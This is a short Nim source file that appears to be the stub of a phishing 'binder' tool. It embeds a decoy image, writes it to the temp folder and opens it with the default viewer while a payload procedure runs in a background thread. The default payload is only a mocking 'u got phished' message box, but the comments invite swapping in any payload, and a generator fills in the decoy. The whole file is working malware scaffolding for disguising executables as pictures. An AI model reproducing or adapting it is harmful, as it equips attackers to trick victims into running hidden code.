import os
import winim/com
import winim/lean
# Example payload, in some case you can just edit this line
# if u don't provide a payload on generation then this is the default one.
proc payload():void = 
    MessageBox(0, "pfft u got phished ", "Hi",  0)

# Compile-time constants, this is supposed to be filled by main application, don't bother trying to pass it manually
const FileName {.strdefine.}: string = "pict.jpg"
const FilePath {.strdefine.}: string = "../pict.jpg"

# Compile-time variable (?) its the content of defined file
const FileData = readFile(FilePath)

var tempPath = getTempDir()
if not dirExists(tempPath):
  createDir(tempPath)
writeFile(tempPath&FileName, FileData)
# Run the file with default app
var thr:Thread[void]
createThread(thr, payload)
var WshShell = CreateObject("WScript.Shell")
WshShell.run(tempPath&FileName)
joinThreads(thr)